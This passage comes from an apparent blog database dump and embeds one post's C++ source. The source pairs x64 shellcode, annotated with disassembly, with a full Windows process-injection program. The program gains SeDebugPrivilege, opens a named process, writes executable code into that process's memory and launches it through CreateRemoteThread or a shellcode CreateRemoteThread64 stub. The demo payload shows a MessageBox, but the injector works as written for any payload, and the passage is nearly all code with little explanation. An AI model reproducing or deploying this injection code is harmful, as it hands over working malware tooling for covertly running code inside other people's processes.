call 0x350                               */\n    /* 0530 */ &quot;\\x0f\\xbe\\xc0&quot;                                     /* movsx eax, al                            */\n    /* 0533 */ &quot;\\x8b\\x4c\\x24\\x28&quot;                                 /* mov ecx, [rsp+0x28]                      */\n    /* 0537 */ &quot;\\x2b\\xc8&quot;                                         /* sub ecx, eax                             */\n    /* 0539 */ &quot;\\x8b\\xc1&quot;                                         /* mov eax, ecx                             */\n    /* 053B */ &quot;\\x89\\x44\\x24\\x24&quot;                                 /* mov [rsp+0x24], eax                      */\n    /* 053F */ &quot;\\x83\\x7c\\x24\\x24\\x00&quot;                             /* cmp dword [rsp+0x24], 0x0                */\n    /* 0544 */ &quot;\\x75\\x1d&quot;                                         /* jnz 0x563                                */\n    /* 0546 */ &quot;\\x0f\\xbe\\x44\\x24\\x20&quot;                             /* movsx eax, byte [rsp+0x20]               */\n    /* 054B */ &quot;\\x85\\xc0&quot;                                         /* test eax, eax                            */\n    /* 054D */ &quot;\\x74\\x14&quot;                                         /* jz 0x563                                 */\n    /* 054F */ &quot;\\x0f\\xbe\\x44\\x24\\x21&quot;                             /* movsx eax, byte [rsp+0x21]               */\n    /* 0554 */ &quot;\\x85\\xc0&quot;                                         /* test eax, eax                            */\n    /* 0556 */ &quot;\\x74\\x0b&quot;                                         /* jz 0x563                                 */\n    /* 0558 */ &quot;\\x83\\x7c\\x24\\x50\\x00&quot;                             /* cmp dword [rsp+0x50], 0x0                */\n    /* 055D */ &quot;\\x0f\\x87\\x60\\xff\\xff\\xff&quot;                         /* ja 0x4c3                                 */\n    /* 0563 */ &quot;\\x8b\\x44\\x24\\x24&quot;                                 /* mov eax, [rsp+0x24]                      */\n    /* 0567 */ &quot;\\x48\\x83\\xc4\\x38&quot;                                 /* add rsp, 0x38                            */\n    /* 056B */ &quot;\\xc3&quot;                                             /* ret                                      */\n    /* 056C */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 056D */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 056E */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 056F */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 0570 */ &quot;\\x44\\x89\\x44\\x24\\x18&quot;                             /* mov [rsp+0x18], r8d                      */\n    /* 0575 */ &quot;\\x48\\x89\\x54\\x24\\x10&quot;                             /* mov [rsp+0x10], rdx                      */\n    /* 057A */ &quot;\\x48\\x89\\x4c\\x24\\x08&quot;                             /* mov [rsp+0x8], rcx                       */\n    /* 057F */ &quot;\\x48\\x83\\xec\\x28&quot;                                 /* sub rsp, 0x28                            */\n    /* 0583 */ &quot;\\x48\\x8b\\x44\\x24\\x38&quot;                             /* mov rax, [rsp+0x38]                      */\n    /* 0588 */ &quot;\\x48\\x89\\x44\\x24\\x10&quot;                             /* mov [rsp+0x10], rax                      */\n    /* 058D */ &quot;\\x48\\x8b\\x44\\x24\\x30&quot;                             /* mov rax, [rsp+0x30]                      */\n    /* 0592 */ &quot;\\x48\\x89\\x44\\x24\\x08&quot;                             /* mov [rsp+0x8], rax                       */\n    /* 0597 */ &quot;\\x8b\\x44\\x24\\x40&quot;                                 /* mov eax, [rsp+0x40]                      */\n    /* 059B */ &quot;\\x89\\x04\\x24&quot;                                     /* mov [rsp], eax                           */\n    /* 059E */ &quot;\\x8b\\x44\\x24\\x40&quot;                                 /* mov eax, [rsp+0x40]                      */\n    /* 05A2 */ &quot;\\xff\\xc8&quot;                                         /* dec eax                                  */\n    /* 05A4 */ &quot;\\x89\\x44\\x24\\x40&quot;                                 /* mov [rsp+0x40], eax                      */\n    /* 05A8 */ &quot;\\x83\\x3c\\x24\\x00&quot;                                 /* cmp dword [rsp], 0x0                     */\n    /* 05AC */ &quot;\\x74\\x2b&quot;                                         /* jz 0x5d9                                 */\n    /* 05AE */ &quot;\\x48\\x8b\\x44\\x24\\x08&quot;                             /* mov rax, [rsp+0x8]                       */\n    /* 05B3 */ &quot;\\x48\\x8b\\x4c\\x24\\x10&quot;                             /* mov rcx, [rsp+0x10]                      */\n    /* 05B8 */ &quot;\\x0f\\xb6\\x09&quot;                                     /* movzx ecx, byte [rcx]                    */\n    /* 05BB */ &quot;\\x88\\x08&quot;                                         /* mov [rax], cl                            */\n    /* 05BD */ &quot;\\x48\\x8b\\x44\\x24\\x08&quot;                             /* mov rax, [rsp+0x8]                       */\n    /* 05C2 */ &quot;\\x48\\xff\\xc0&quot;                                     /* inc rax                                  */\n    /* 05C5 */ &quot;\\x48\\x89\\x44\\x24\\x08&quot;                             /* mov [rsp+0x8], rax                       */\n    /* 05CA */ &quot;\\x48\\x8b\\x44\\x24\\x10&quot;                             /* mov rax, [rsp+0x10]                      */\n    /* 05CF */ &quot;\\x48\\xff\\xc0&quot;                                     /* inc rax                                  */\n    /* 05D2 */ &quot;\\x48\\x89\\x44\\x24\\x10&quot;                             /* mov [rsp+0x10], rax                      */\n    /* 05D7 */ &quot;\\xeb\\xbe&quot;                                         /* jmp 0x597                                */\n    /* 05D9 */ &quot;\\x48\\x8b\\x44\\x24\\x30&quot;                             /* mov rax, [rsp+0x30]                      */\n    /* 05DE */ &quot;\\x48\\x83\\xc4\\x28&quot;                                 /* add rsp, 0x28                            */\n    /* 05E2 */ &quot;\\xc3&quot;                                             /* ret                                      */\n    /* 05E3 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 05E4 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 05E5 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 05E6 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 05E7 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 05E8 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 05E9 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 05EA */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 05EB */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 05EC */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 05ED */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 05EE */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 05EF */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 05F0 */ &quot;\\x48\\x89\\x4c\\x24\\x08&quot;                             /* mov [rsp+0x8], rcx                       */\n    /* 05F5 */ &quot;\\x48\\x83\\xec\\x18&quot;                                 /* sub rsp, 0x18                            */\n    /* 05F9 */ &quot;\\xc7\\x04\\x24\\x00\\x00\\x00\\x00&quot;                     /* mov dword [rsp], 0x0                     */\n    /* 0600 */ &quot;\\x48\\x8b\\x44\\x24\\x20&quot;                             /* mov rax, [rsp+0x20]                      */\n    /* 0605 */ &quot;\\x48\\x89\\x44\\x24\\x08&quot;                             /* mov [rsp+0x8], rax                       */\n    /* 060A */ &quot;\\x8b\\x04\\x24&quot;                                     /* mov eax, [rsp]                           */\n    /* 060D */ &quot;\\xc1\\xe0\\x07&quot;                                     /* shl eax, 0x7                             */\n    /* 0610 */ &quot;\\x8b\\x0c\\x24&quot;                                     /* mov ecx, [rsp]                           */\n    /* 0613 */ &quot;\\xc1\\xe9\\x19&quot;                                     /* shr ecx, 0x19                            */\n    /* 0616 */ &quot;\\x03\\xc1&quot;                                         /* add eax, ecx                             */\n    /* 0618 */ &quot;\\x48\\x8b\\x4c\\x24\\x08&quot;                             /* mov rcx, [rsp+0x8]                       */\n    /* 061D */ &quot;\\x0f\\xb6\\x09&quot;                                     /* movzx ecx, byte [rcx]                    */\n    /* 0620 */ &quot;\\x03\\xc1&quot;                                         /* add eax, ecx                             */\n    /* 0622 */ &quot;\\x89\\x04\\x24&quot;                                     /* mov [rsp], eax                           */\n    /* 0625 */ &quot;\\x48\\x8b\\x44\\x24\\x08&quot;                             /* mov rax, [rsp+0x8]                       */\n    /* 062A */ &quot;\\x0f\\xb6\\x00&quot;                                     /* movzx eax, byte [rax]                    */\n    /* 062D */ &quot;\\x89\\x44\\x24\\x04&quot;                                 /* mov [rsp+0x4], eax                       */\n    /* 0631 */ &quot;\\x48\\x8b\\x44\\x24\\x08&quot;                             /* mov rax, [rsp+0x8]                       */\n    /* 0636 */ &quot;\\x48\\xff\\xc0&quot;                                     /* inc rax                                  */\n    /* 0639 */ &quot;\\x48\\x89\\x44\\x24\\x08&quot;                             /* mov [rsp+0x8], rax                       */\n    /* 063E */ &quot;\\x83\\x7c\\x24\\x04\\x00&quot;                             /* cmp dword [rsp+0x4], 0x0                 */\n    /* 0643 */ &quot;\\x75\\xc5&quot;                                         /* jnz 0x60a                                */\n    /* 0645 */ &quot;\\x8b\\x04\\x24&quot;                                     /* mov eax, [rsp]                           */\n    /* 0648 */ &quot;\\x48\\x83\\xc4\\x18&quot;                                 /* add rsp, 0x18                            */\n    /* 064C */ &quot;\\xc3&quot;                                             /* ret                                      */\n    /* 064D */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 064E */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 064F */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 0650 */ &quot;\\x48\\x81\\xec\\x88\\x02\\x00\\x00&quot;                     /* sub rsp, 0x288                           */\n    /* 0657 */ &quot;\\x48\\xc7\\x44\\x24\\x60\\xff\\xff\\xff\\xff&quot;             /* mov qword [rsp+0x60], 0xffffffffffffffff */\n    /* 0660 */ &quot;\\x65\\x48\\x8b\\x04\\x25\\x60\\x00\\x00\\x00&quot;             /* mov rax, [gs:0x60]                       */\n    /* 0669 */ &quot;\\x48\\x89\\x44\\x24\\x68&quot;                             /* mov [rsp+0x68], rax                      */\n    /* 066E */ &quot;\\x48\\x8b\\x44\\x24\\x68&quot;                             /* mov rax, [rsp+0x68]                      */\n    /* 0673 */ &quot;\\x48\\x8b\\x40\\x18&quot;                                 /* mov rax, [rax+0x18]                      */\n    /* 0677 */ &quot;\\x48\\x83\\xc0\\x20&quot;                                 /* add rax, 0x20                            */\n    /* 067B */ &quot;\\x48\\x89\\x44\\x24\\x58&quot;                             /* mov [rsp+0x58], rax                      */\n    /* 0680 */ &quot;\\x48\\x8b\\x44\\x24\\x58&quot;                             /* mov rax, [rsp+0x58]                      */\n    /* 0685 */ &quot;\\x48\\x8b\\x00&quot;                                     /* mov rax, [rax]                           */\n    /* 0688 */ &quot;\\x48\\x89\\x44\\x24\\x30&quot;                             /* mov [rsp+0x30], rax                      */\n    /* 068D */ &quot;\\xb8\\x6b\\x00\\x00\\x00&quot;                             /* mov eax, 0x6b                            */\n    /* 0692 */ &quot;\\x66\\x89\\x44\\x24\\x38&quot;                             /* mov [rsp+0x38], ax                       */\n    /* 0697 */ &quot;\\xb8\\x65\\x00\\x00\\x00&quot;                             /* mov eax, 0x65                            */\n    /* 069C */ &quot;\\x66\\x89\\x44\\x24\\x3a&quot;                             /* mov [rsp+0x3a], ax                       */\n    /* 06A1 */ &quot;\\xb8\\x72\\x00\\x00\\x00&quot;                             /* mov eax, 0x72                            */\n    /* 06A6 */ &quot;\\x66\\x89\\x44\\x24\\x3c&quot;                             /* mov [rsp+0x3c], ax                       */\n    /* 06AB */ &quot;\\xb8\\x6e\\x00\\x00\\x00&quot;                             /* mov eax, 0x6e                            */\n    /* 06B0 */ &quot;\\x66\\x89\\x44\\x24\\x3e&quot;                             /* mov [rsp+0x3e], ax                       */\n    /* 06B5 */ &quot;\\xb8\\x65\\x00\\x00\\x00&quot;                             /* mov eax, 0x65                            */\n    /* 06BA */ &quot;\\x66\\x89\\x44\\x24\\x40&quot;                             /* mov [rsp+0x40], ax                       */\n    /* 06BF */ &quot;\\xb8\\x6c\\x00\\x00\\x00&quot;                             /* mov eax, 0x6c                            */\n    /* 06C4 */ &quot;\\x66\\x89\\x44\\x24\\x42&quot;                             /* mov [rsp+0x42], ax                       */\n    /* 06C9 */ &quot;\\xb8\\x33\\x00\\x00\\x00&quot;                             /* mov eax, 0x33                            */\n    /* 06CE */ &quot;\\x66\\x89\\x44\\x24\\x44&quot;                             /* mov [rsp+0x44], ax                       */\n    /* 06D3 */ &quot;\\xb8\\x32\\x00\\x00\\x00&quot;                             /* mov eax, 0x32                            */\n    /* 06D8 */ &quot;\\x66\\x89\\x44\\x24\\x46&quot;                             /* mov [rsp+0x46], ax                       */\n    /* 06DD */ &quot;\\xb8\\x2e\\x00\\x00\\x00&quot;                             /* mov eax, 0x2e                            */\n    /* 06E2 */ &quot;\\x66\\x89\\x44\\x24\\x48&quot;                             /* mov [rsp+0x48], ax                       */\n    /* 06E7 */ &quot;\\xb8\\x64\\x00\\x00\\x00&quot;                             /* mov eax, 0x64                            */\n    /* 06EC */ &quot;\\x66\\x89\\x44\\x24\\x4a&quot;                             /* mov [rsp+0x4a], ax                       */\n    /* 06F1 */ &quot;\\xb8\\x6c\\x00\\x00\\x00&quot;                             /* mov eax, 0x6c                            */\n    /* 06F6 */ &quot;\\x66\\x89\\x44\\x24\\x4c&quot;                             /* mov [rsp+0x4c], ax                       */\n    /* 06FB */ &quot;\\xb8\\x6c\\x00\\x00\\x00&quot;                             /* mov eax, 0x6c                            */\n    /* 0700 */ &quot;\\x66\\x89\\x44\\x24\\x4e&quot;                             /* mov [rsp+0x4e], ax                       */\n    /* 0705 */ &quot;\\x33\\xc0&quot;                                         /* xor eax, eax                             */\n    /* 0707 */ &quot;\\x66\\x89\\x44\\x24\\x50&quot;                             /* mov [rsp+0x50], ax                       */\n    /* 070C */ &quot;\\x48\\x8b\\x44\\x24\\x58&quot;                             /* mov rax, [rsp+0x58]                      */\n    /* 0711 */ &quot;\\x48\\x39\\x44\\x24\\x30&quot;                             /* cmp [rsp+0x30], rax                      */\n    /* 0716 */ &quot;\\x0f\\x84\\x8b\\x00\\x00\\x00&quot;                         /* jz 0x7a7                                 */\n    /* 071C */ &quot;\\x48\\x8b\\x44\\x24\\x30&quot;                             /* mov rax, [rsp+0x30]                      */\n    /* 0721 */ &quot;\\x48\\x83\\xe8\\x10&quot;                                 /* sub rax, 0x10                            */\n    /* 0725 */ &quot;\\x48\\x89\\x44\\x24\\x28&quot;                             /* mov [rsp+0x28], rax                      */\n    /* 072A */ &quot;\\x48\\x8b\\x44\\x24\\x28&quot;                             /* mov rax, [rsp+0x28]                      */\n    /* 072F */ &quot;\\x0f\\xb7\\x40\\x48&quot;                                 /* movzx eax, word [rax+0x48]               */\n    /* 0733 */ &quot;\\x85\\xc0&quot;                                         /* test eax, eax                            */\n    /* 0735 */ &quot;\\x74\\x5e&quot;                                         /* jz 0x795                                 */\n    /* 0737 */ &quot;\\x48\\x8b\\x44\\x24\\x28&quot;                             /* mov rax, [rsp+0x28]                      */\n    /* 073C */ &quot;\\x0f\\xb7\\x40\\x48&quot;                                 /* movzx eax, word [rax+0x48]               */\n    /* 0740 */ &quot;\\x89\\x44\\x24\\x20&quot;                                 /* mov [rsp+0x20], eax                      */\n    /* 0744 */ &quot;\\x44\\x8b\\x44\\x24\\x20&quot;                             /* mov r8d, [rsp+0x20]                      */\n    /* 0749 */ &quot;\\x48\\x8b\\x44\\x24\\x28&quot;                             /* mov rax, [rsp+0x28]                      */\n    /* 074E */ &quot;\\x48\\x8b\\x50\\x50&quot;                                 /* mov rdx, [rax+0x50]                      */\n    /* 0752 */ &quot;\\x48\\x8d\\x4c\\x24\\x70&quot;                             /* lea rcx, [rsp+0x70]                      */\n    /* 0757 */ &quot;\\xe8\\x14\\xfe\\xff\\xff&quot;                             /* call 0x570                               */\n    /* 075C */ &quot;\\x8b\\x44\\x24\\x20&quot;                                 /* mov eax, [rsp+0x20]                      */\n    /* 0760 */ &quot;\\x33\\xd2&quot;                                         /* xor edx, edx                             */\n    /* 0762 */ &quot;\\xb9\\x02\\x00\\x00\\x00&quot;                             /* mov ecx, 0x2                             */\n    /* 0767 */ &quot;\\x48\\xf7\\xf1&quot;                                     /* div rcx                                  */\n    /* 076A */ &quot;\\x33\\xc9&quot;                                         /* xor ecx, ecx                             */\n    /* 076C */ &quot;\\x66\\x89\\x4c\\x44\\x70&quot;                             /* mov [rsp+rax*2+0x70], cx                 */\n    /* 0771 */ &quot;\\x48\\x8d\\x54\\x24\\x38&quot;                             /* lea rdx, [rsp+0x38]                      */\n    /* 0776 */ &quot;\\x48\\x8d\\x4c\\x24\\x70&quot;                             /* lea rcx, [rsp+0x70]                      */\n    /* 077B */ &quot;\\xe8\\x50\\xfc\\xff\\xff&quot;                             /* call 0x3d0                               */\n    /* 0780 */ &quot;\\x48\\x85\\xc0&quot;                                     /* test rax, rax                            */\n    /* 0783 */ &quot;\\x74\\x10&quot;                                         /* jz 0x795                                 */\n    /* 0785 */ &quot;\\x48\\x8b\\x44\\x24\\x28&quot;                             /* mov rax, [rsp+0x28]                      */\n    /* 078A */ &quot;\\x48\\x8b\\x40\\x30&quot;                                 /* mov rax, [rax+0x30]                      */\n    /* 078E */ &quot;\\x48\\x89\\x44\\x24\\x60&quot;                             /* mov [rsp+0x60], rax                      */\n    /* 0793 */ &quot;\\xeb\\x12&quot;                                         /* jmp 0x7a7                                */\n    /* 0795 */ &quot;\\x48\\x8b\\x44\\x24\\x30&quot;                             /* mov rax, [rsp+0x30]                      */\n    /* 079A */ &quot;\\x48\\x8b\\x00&quot;                                     /* mov rax, [rax]                           */\n    /* 079D */ &quot;\\x48\\x89\\x44\\x24\\x30&quot;                             /* mov [rsp+0x30], rax                      */\n    /* 07A2 */ &quot;\\xe9\\x65\\xff\\xff\\xff&quot;                             /* jmp 0x70c                                */\n    /* 07A7 */ &quot;\\x48\\x8b\\x44\\x24\\x60&quot;                             /* mov rax, [rsp+0x60]                      */\n    /* 07AC */ &quot;\\x48\\x81\\xc4\\x88\\x02\\x00\\x00&quot;                     /* add rsp, 0x288                           */\n    /* 07B3 */ &quot;\\xc3&quot;                                             /* ret                                      */\n    /* 07B4 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 07B5 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 07B6 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 07B7 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 07B8 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 07B9 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 07BA */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 07BB */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 07BC */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 07BD */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 07BE */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 07BF */ &quot;\\xcc&quot;                                             /* int3                                     */\n};\ntypedef struct _RemoteParam {\n    char szMsg[12];    //MessageBox函数中显示的字符提示  \n    DWORD dwMessageBox;//MessageBox函数的入口地址  \n} RemoteParam, * PRemoteParam;\ntypedef VOID(*pCreateRemoteThread64) (HANDLE hProcess,\n    LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize,\n    LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter,\n    DWORD dwCreationFlags, LPDWORD lpThreadId, LPHANDLE hThread);\n//定义MessageBox类型的函数指针\ntypedef int(__stdcall* PFN_MESSAGEBOX)(HWND, LPCSTR, LPCSTR, DWORD);\n\nDWORD __stdcall threadProc(LPVOID lParam)\n{\n    RemoteParam* pRP = (RemoteParam*)lParam;\n    PFN_MESSAGEBOX pfnMessageBox;\n    pfnMessageBox = (PFN_MESSAGEBOX)pRP-&gt;dwMessageBox;\n    pfnMessageBox(NULL, pRP-&gt;szMsg, pRP-&gt;szMsg, 0);\n    return 0;\n}\nbool enableDebugPriv()\n{\n    HANDLE hToken;\n    LUID sedebugnameValue;\n    TOKEN_PRIVILEGES tkp;\n    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken)) {\n        return false;\n    }\n    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;sedebugnameValue)) {\n        CloseHandle(hToken);\n        return false;\n    }\n    tkp.PrivilegeCount = 1;\n    tkp.Privileges[0].Luid = sedebugnameValue;\n    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;\n    if (!AdjustTokenPrivileges(hToken, FALSE, &amp;tkp, sizeof(tkp), NULL, NULL)) {\n        CloseHandle(hToken);\n        return false;\n    }\n    return true;\n}\nHANDLE GetProcessHandleByName(LPCWSTR lpszProcessName)\n{\n    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n    PROCESSENTRY32 pe;\n    pe.dwSize = sizeof(PROCESSENTRY32);\n    if (!Process32First(hSnapshot, &amp;pe)) {\n        MessageBoxA(NULL,\n            &quot;The frist entry of the process list has not been copyied to the buffer&quot;,\n            &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK);\n        return 0;\n    }\n    while (Process32Next(hSnapshot, &amp;pe)) {\n        if (!lstrcmpW(lpszProcessName, pe.szExeFile)) {\n            return OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);\n        }\n    }\n    return 0;\n}\nLPVOID init_func(char* asmcode, DWORD len)\n{\n    LPVOID sc = NULL;\n    // allocate write/executable memory for code\n    sc = VirtualAlloc(0, len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n    if (sc != NULL) {\n        // copy code\n        memcpy(sc, asmcode, len);\n    }\n    else {\n        MessageBoxA(NULL, &quot;VirtualAlloc()&quot;, &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK);\n    }\n    return sc;\n}\nint main()\n{\n    const DWORD dwThreadSize = 4096;\n    DWORD dwWriteBytes = 0;\n    enableDebugPriv();\n    HANDLE TargetProc = GetProcessHandleByName(L&quot;CCC.exe&quot;);//进程名称\n    if (!TargetProc)\n    {\n        MessageBoxA(NULL,\n            &quot;Open target process failed !&quot;,\n            &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK);\n        return 0;\n    }\n\n    BOOL ISWow64 = false;\n    IsWow64Process(TargetProc, &amp;ISWow64);\n\n    if (ISWow64)\n    {\n        cout &lt;&lt; &quot;32Bit Process &quot; &lt;&lt;endl;\n        //在宿主进程中为线程体开辟一块存储区域  \n        //在这里需要注意MEM_COMMIT | MEM_RESERVE内存非配类型以及PAGE_EXECUTE_READWRITE内存保护类型  \n        //其具体含义请参考MSDN中关于VirtualAllocEx函数的说明。  \n        void* pRemoteThread = VirtualAllocEx(TargetProc, 0,\n            dwThreadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n        if (!pRemoteThread) {\n            MessageBoxA(NULL, &quot;Alloc memory in target process failed !&quot;,\n                &quot;notice&quot;, MB_ICONINFORMATION | MB_OK);\n            return 0;\n        }\n\n        //将线程体拷贝到宿主进程中  \n        if (!WriteProcessMemory(TargetProc,\n            pRemoteThread, &amp;threadProc, dwThreadSize, 0)) {\n            MessageBoxA(NULL, &quot;Write data to target process failed !&quot;,\n                &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK);\n            return 0;\n        }\n        cout &lt;&lt; &quot;pRemoteThread:&quot; &lt;&lt; hex &lt;&lt; pRemoteThread &lt;&lt; endl;\n        getchar();\n        //定义线程参数结构体变量  \n        RemoteParam remoteData;\n        ZeroMemory(&amp;remoteData, sizeof(RemoteParam));\n\n        //填充结构体变量中的成员  \n        HINSTANCE hUser32 = LoadLibrary(L&quot;User32.dll&quot;);\n        remoteData.dwMessageBox = (DWORD)GetProcAddress(hUser32, &quot;MessageBoxA&quot;);\n        strcat_s(remoteData.szMsg, &quot;Hello＼0&quot;);\n\n        //为线程参数在宿主进程中开辟存储区域  \n        RemoteParam* pRemoteParam = (RemoteParam*)VirtualAllocEx(\n            TargetProc, 0, sizeof(RemoteParam), MEM_COMMIT, PAGE_READWRITE);\n\n        if (!pRemoteParam) {\n            MessageBoxA(NULL, &quot;Alloc memory failed !&quot;,\n                &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK);\n            return 0;\n        }\n        //将线程参数拷贝到宿主进程地址空间中  \n        if (!WriteProcessMemory(TargetProc,\n            pRemoteParam, &amp;remoteData, sizeof(remoteData), 0)) {\n            MessageBoxA(NULL, &quot;Write data to target process failed !&quot;,\n                &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK);\n            return 0;\n        }\n\n        //在宿主进程中创建线程  \n        HANDLE hRemoteThread = CreateRemoteThread(\n            TargetProc, NULL, 0, (DWORD(__stdcall*)(void*))pRemoteThread,\n            pRemoteParam, 0, &amp;dwWriteBytes);\n        if (!hRemoteThread) {\n            MessageBoxA(NULL, &quot;Create remote thread failed !&quot;, &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK);\n            return 0;\n        }\n        CloseHandle(hRemoteThread);\n        FreeLibrary(hUser32);\n        return 0;\n\n    }\n    else\n    {\n\n        cout &lt;&lt; &quot;64Bit Process &quot; &lt;&lt; endl;\n        void* pRemoteThread = VirtualAllocEx(TargetProc, 0,\n            EXECPIC_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n        if (!pRemoteThread) {\n            MessageBoxA(NULL, &quot;Alloc memory in target process failed !&quot;,\n                &quot;notice&quot;, MB_ICONINFORMATION | MB_OK);\n            return 0;\n        }\n        if (!WriteProcessMemory(TargetProc, pRemoteThread, EXECPIC, EXECPIC_SIZE, 0))\n        {\n            MessageBoxA(NULL, &quot;Write data to target process failed !&quot;,\n                &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK);\n            return 0;\n        }\n        HANDLE hThread = NULL;\n        pCreateRemoteThread64 CreateRemoteThread64 = (pCreateRemoteThread64)init_func(CREATETHREADPIC, CREATETHREADPIC_SIZE);\n        CreateRemoteThread64(TargetProc, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteThread, 0, 0, 0, &amp;hThread);\n        if (!hThread)\n        {\n            MessageBoxA(NULL, &quot;CreateRemoteThread64 target thread failed !&quot;,\n                &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK);\n            return 0;\n        }\n        WaitForSingleObject(hThread, INFINITE);\n    }\n    return 0;\n}</code></pre>\n"}],"PostAsset":[],"PostCategory":[{"post_id":"ckhiiw61e0004ccuqo5zr2q0d","category_id":"ckhiiw61j0007ccuqh2ftl8gm","_id":"ckhiiw61o000cccuqsmecfu9i"},{"post_id":"ckhiiw61y000hccuqns81c7ff","category_id":"ckhiiw61j0007ccuqh2ftl8gm","_id":"ckhiiw628000mccuq6hipg1ad"},{"post_id":"ckhiiw628000uccuqk21tussu","category_id":"ckhiiw628000rccuqa51bd5v4","_id":"ckhiiw62n0012ccuqfqchwlzq"},{"post_id":"ckhiiw628000nccuqosmsb6bd","category_id":"ckhiiw628000rccuqa51bd5v4","_id":"ckhiiw62o0016ccuqecudjhvy"},{"post_id":"ckhiiw62j000wccuqk7hd7lj4","category_id":"ckhiiw61j0007ccuqh2ftl8gm","_id":"ckhiiw62q0019ccuqi0vrup33"},{"post_id":"ckhiiw628000qccuq08dli5k8","category_id":"ckhiiw62k000xccuqu7cxaezv","_id":"ckhiiw62w001cccuqp89w8s2y"},{"post_id":"ckhiiw62p0018ccuq9150izpy","category_id":"ckhiiw61j0007ccuqh2ftl8gm","_id":"ckhiiw62y001iccuqpebx5m6a"},{"post_id":"ckhiiw630001nccuqhwxyxe5d","category_id":"ckhiiw628000rccuqa51bd5v4","_id":"ckhiiw636001tccuq0bnnh302"},{"post_id":"ckhiiw636001uccuq0atk7ppq","category_id":"ckhiiw61j0007ccuqh2ftl8gm","_id":"ckhiiw63c0021ccuqkywluc55"},{"post_id":"ckhiiw63c002gccuqmwuaq935","category_id":"ckhiiw61j0007ccuqh2ftl8gm","_id":"ckhiiw63m002mccuqe1psgx1p"},{"post_id":"ckhiiw63c002iccuq7kj6px1k","category_id":"ckhiiw61j0007ccuqh2ftl8gm","_id":"ckhiiw63m002nccuqswgs43d9"}],"PostTag":[{"post_id":"ckhiiw60u0000ccuq2yrsugqd","tag_id":"ckhiiw61e0002ccuquvu23m69","_id":"ckhiiw61j0008ccuqo76mdmd5"},{"post_id":"ckhiiw6190001ccuqf76alw9v","tag_id":"ckhiiw61j0006ccuqthl0wmso","_id":"ckhiiw61o000accuqsbbphwqq"},{"post_id":"ckhiiw61e0003ccuq6bk6srcd","tag_id":"ckhiiw61o0009ccuqdllj52mk","_id":"ckhiiw61o000dccuqp9iqb4ot"},{"post_id":"ckhiiw61e0004ccuqo5zr2q0d","tag_id":"ckhiiw61o000bccuqireoesj6","_id":"ckhiiw61o000fccuqn3mug13g"},{"post_id":"ckhiiw61j0005ccuqbu6f7it2","tag_id":"ckhiiw61o000eccuq3rbjhs49","_id":"ckhiiw61o000gccuqvn2qh91p"},{"post_id":"ckhiiw61y000hccuqns81c7ff","tag_id":"ckhiiw628000jccuq2q0bocow","_id":"ckhiiw628000pccuq4ebcecci"},{"post_id":"ckhiiw628000sccuq7dvf2dg4","tag_id":"ckhiiw61j0006ccuqthl0wmso","_id":"ckhiiw62j000vccuqvxmazods"},{"post_id":"ckhiiw61y000iccuqjgtabq88","tag_id":"ckhiiw628000occuqw4eghvjt","_id":"ckhiiw62m0010ccuqwl396ead"},{"post_id":"ckhiiw61y000iccuqjgtabq88","tag_id":"ckhiiw628000tccuq80r9rs1w","_id":"ckhiiw62n0013ccuqwjtynmfa"},{"post_id":"ckhiiw62l000zccuq4kkegksi","tag_id":"ckhiiw61o0009ccuqdllj52mk","_id":"ckhiiw62p0017ccuqs4ndvaak"},{"post_id":"ckhiiw628000kccuqk8v1wx3k","tag_id":"ckhiiw62k000yccuqhuxwbc04","_id":"ckhiiw62u001accuq8szp9v84"},{"post_id":"ckhiiw62p0018ccuq9150izpy","tag_id":"ckhiiw61